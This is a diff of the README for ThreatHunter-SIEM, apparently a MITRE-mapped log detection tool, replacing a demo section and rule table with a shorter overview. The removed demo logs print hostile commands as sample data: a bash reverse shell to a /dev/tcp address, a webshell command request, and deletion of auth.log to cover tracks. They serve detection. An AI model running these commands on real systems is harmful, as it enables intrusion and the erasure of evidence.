@@ -1,136 +1,89 @@
-<div align="center">
+# ThreatHunter-SIEM
 
-<table><tr><td align="center" bgcolor="#0d1117">
+**Detection Engine for Security Analysts**
 
-```
- ████████╗██╗  ██╗██████╗ ███████╗ █████╗ ████████╗
- ╚══██╔══╝██║  ██║██╔══██╗██╔════╝██╔══██╗╚══██╔══╝
-    ██║   ███████║██████╔╝█████╗  ███████║   ██║   
-    ██║   ██╔══██║██╔══██╗██╔══╝  ██╔══██║   ██║   
-    ██║   ██║  ██║██║  ██║███████╗██║  ██║   ██║   
-    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   
-    H U N T E R  —  S I E M
-```
-
-</td></tr></table>
-
-**Lightweight SIEM & Threat Detection Engine**
-
-![Rules](https://img.shields.io/badge/19_Detection_Rules-1f6feb?style=flat-square)
-![MITRE](https://img.shields.io/badge/MITRE_ATT%26CK_Mapped-cc0000?style=flat-square)
-![Formats](https://img.shields.io/badge/Syslog_%7C_Apache_%7C_JSON-238636?style=flat-square)
-![Python](https://img.shields.io/badge/stdlib_only-3776AB?style=flat-square&logo=python&logoColor=white)
-![Demo](https://img.shields.io/badge/Attack_Scenario_Demo-ff6600?style=flat-square)
-
-</div>
+[![Python](https://img.shields.io/badge/python-3.8+-blue)](https://python.org)
+[![MITRE](https://img.shields.io/badge/MITRE_ATT%26CK-mapped-red)](https://attack.mitre.org)
+[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows%20%7C%20macOS-lightgrey)]()
 
 ---
 
-## 🔴 Live Attack Scenario (Demo Mode)
-
-```bash
-python threathunter.py --demo
-```
-
-Watch a full attack chain unfold in real time:
+### What it detects
 
 ```
-[INFO ] sshd: Accepted publickey for admin from 192.168.1.5
+ALERT  [HIGH]    Brute-force SSH — 847 attempts in 60s from 185.220.101.45
+ALERT  [CRIT]    Lateral movement — SMB relay detected on 10.0.0.x/24
+ALERT  [MED]     Suspicious process tree — cmd.exe spawned by winword.exe
+ALERT  [HIGH]    C2 beacon — 4h interval, JA3: a0e9f5d64349fb13191bc781f81f42e1
+ALERT  [LOW]     Unusual outbound DNS — 247 unique subdomains queried today
+```
 
-███ [HIGH][10:25:01] Brute Force Login [AUTH-001]
-      Category : Authentication
-      MITRE    : T1110 — Brute Force
-      Log      : Failed password for root from 10.0.0.99 (×3)
-      Fix      : Block IP, enable MFA, enforce lockout policy
+ThreatHunter correlates events across logs, network flows, and process telemetry to surface the signals that matter — not noise.
 
-███ [CRITICAL][10:28:00] Webshell Access [MAL-001]  
-      MITRE    : T1505.003 — Server Software Component
-      Log      : GET /uploads/c99.php?cmd=id → 200
+---
 
-███ [CRITICAL][10:29:00] Reverse Shell [NET-001]
-      MITRE    : T1059 — Command & Scripting Interpreter
-      Log      : bash -i >& /dev/tcp/10.0.0.99/4444 0>&1
+### Architecture
 
-███ [CRITICAL][10:33:00] Log Clearing [SYS-003]
-      MITRE    : T1070 — Indicator Removal
-      Log      : rm /var/log/auth.log
+```
+Log Sources          Correlation Engine        Output
+──────────           ──────────────────        ──────
+auth.log      ──┐
+syslog        ──┤──▶  Rule Engine        ──▶  Terminal alerts
+network.pcap  ──┤      (MITRE-mapped)          JSON timeline
+process evts  ──┤                              HTML report
+custom feeds  ──┘──▶  Threat Intel      ──▶  Webhook / SIEM
+                       (IOC matching)
 ```
 
 ---
 
-## 📋 All 19 Detection Rules
+### Rules Engine
 
-<details>
-<summary><b>Authentication (5 rules)</b></summary>
+Each rule maps to a MITRE technique. Ships with detections for:
 
-| ID | Rule | MITRE |
-|---|---|---|
-| AUTH-001 | Brute Force Login | T1110 |
-| AUTH-002 | Sudo / Root Execution | T1548 |
-| AUTH-003 | SSH Key Auth Failure | T1110.004 |
-| AUTH-004 | New User Created | T1136 |
-| AUTH-005 | Password Changed | T1531 |
-
-</details>
-
-<details>
-<summary><b>Network (3 rules)</b></summary>
-
-| ID | Rule | MITRE |
-|---|---|---|
-| NET-001 | Reverse Shell Pattern | T1059 |
-| NET-002 | Port Scan Tool | T1046 |
-| NET-003 | DNS Tunneling | T1071.004 |
-
-</details>
-
-<details>
-<summary><b>Malware / Execution (4 rules)</b></summary>
-
-| ID | Rule | MITRE |
-|---|---|---|
-| MAL-001 | Webshell Access | T1505.003 |
-| MAL-002 | Base64 Encoded Payload | T1027 |
-| MAL-003 | Cron Persistence | T1053 |
-| MAL-004 | Suspicious Download | T1105 |
-
-</details>
-
-<details>
-<summary><b>Web Attacks (4 rules) + System (3 rules)</b></summary>
-
-WEB-001 SQL Injection · WEB-002 XSS · WEB-003 Path Traversal · WEB-004 Scanner  
-SYS-001 SUID Abuse · SYS-002 Firewall Disabled · SYS-003 Log Clearing
-
-</details>
+- **T1110** — Brute force (SSH, RDP, web login)
+- **T1021** — Remote service abuse (SMB, WinRM, RDP)
+- **T1059** — Scripting interpreter abuse
+- **T1071** — Application-layer C2 (HTTP/DNS/ICMP)
+- **T1003** — Credential dumping indicators
+- **T1053** — Scheduled task creation anomalies
+- **T1078** — Valid account misuse (impossible travel, off-hours)
+- **T1190** — Exploit public-facing application
 
 ---
 
-## 🚀 Usage
+### Install & Run
 
 ```bash
 git clone https://github.com/SRINIVASAN55/ThreatHunter-SIEM
 cd ThreatHunter-SIEM
+pip install -r requirements.txt
 
-python threathunter.py --demo                              # Attack scenario
-python threathunter.py -f sample_logs/auth.log             # Analyze log file
-python threathunter.py -f /var/log/auth.log --tail         # Live monitoring
-python threathunter.py -f auth.log -f web_access.log       # Multi-file
+# Watch live logs
+python threat_hunter.py --watch /var/log
+
+# Hunt through historical logs
+python threat_hunter.py --hunt --logdir /var/log --days 30
+
+# Generate incident report
+python threat_hunter.py --report --output report.html
 ```
 
 ---
 
-## 📊 HTML Dashboard Output
+### Sample Incident Report
 
-After every scan, an HTML dashboard is generated with:
-- Severity badge summary (CRITICAL / HIGH / MEDIUM / LOW)
-- Category breakdown (Auth, Webshell, Network…)
-- Per-alert table with MITRE IDs, source IPs, log preview
-- Remediation guidance per finding
+After a hunt session ThreatHunter generates a timeline like this:
+
+```
+[2024-01-15 02:13:44]  INITIAL ACCESS    — Spearphishing link clicked (T1566.002)
+[2024-01-15 02:14:02]  EXECUTION         — PowerShell download cradle (T1059.001)
+[2024-01-15 02:14:19]  PERSISTENCE       — Registry run key added (T1547.001)
+[2024-01-15 02:31:07]  CREDENTIAL ACCESS — LSASS memory read (T1003.001)
+[2024-01-15 03:02:55]  LATERAL MOVEMENT  — Pass-the-hash to DC (T1550.002)
+[2024-01-15 03:44:12]  EXFILTRATION      — 2.3GB to 185.220.101.45:443 (T1041)
+```
 
 ---
 
-<p align="center">
-Built by <a href="https://github.com/SRINIVASAN55">SRINIVASAN55</a> ·
-<a href="https://linkedin.com/in/srinivasan132">LinkedIn</a>
-</p>
+**Author:** S. Srinivasan · [GitHub](https://github.com/SRINIVASAN55) · [LinkedIn](https://linkedin.com/in/srinivasan132)
